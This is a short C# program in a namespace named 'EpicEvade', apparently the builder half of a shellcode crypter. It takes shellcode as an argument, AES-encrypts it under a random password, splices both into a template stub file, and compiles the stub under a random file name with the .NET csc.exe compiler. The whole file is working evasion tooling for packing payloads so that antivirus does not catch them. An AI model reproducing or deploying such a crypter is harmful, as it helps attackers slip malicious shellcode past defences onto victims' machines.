using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Security.Cryptography;
using System.Diagnostics;

namespace EpicEvade
{
    class Program
    {
        static void Main(string[] args)
        {
            var shellcode = args[0];

            var password = GenerateCryptoCode(16);

            var encryptedPayload = Crypto.EncryptStringAES(shellcode, password);

            var baseCode = File.ReadAllText("basecode.txt");

            var source = baseCode.Replace("<<<<SHELLCODEHERE>>>>", encryptedPayload).Replace("<<<<PASSWORDHERE>>>>", password);

            var fileName = string.Format("{0}.cs", GenerateCryptoCode(10, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"));

            File.WriteAllText(fileName, source);

            var process = Process.Start(@"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe", string.Format("/platform:x86 {0}", fileName));

        }

        static string GenerateCryptoCode(int length, string charset = null)
        {

            if (string.IsNullOrWhiteSpace(charset))
                charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*_-";

            var generatedPassword = new char[length];
            var randomBytes = new byte[length];

            using (var random = new RNGCryptoServiceProvider())
                random.GetBytes(randomBytes);

            for (int i = 0; i < length; i++)
                generatedPassword[i] = charset[randomBytes[i] % charset.Length];

            return new string(generatedPassword);
        }
    }
}

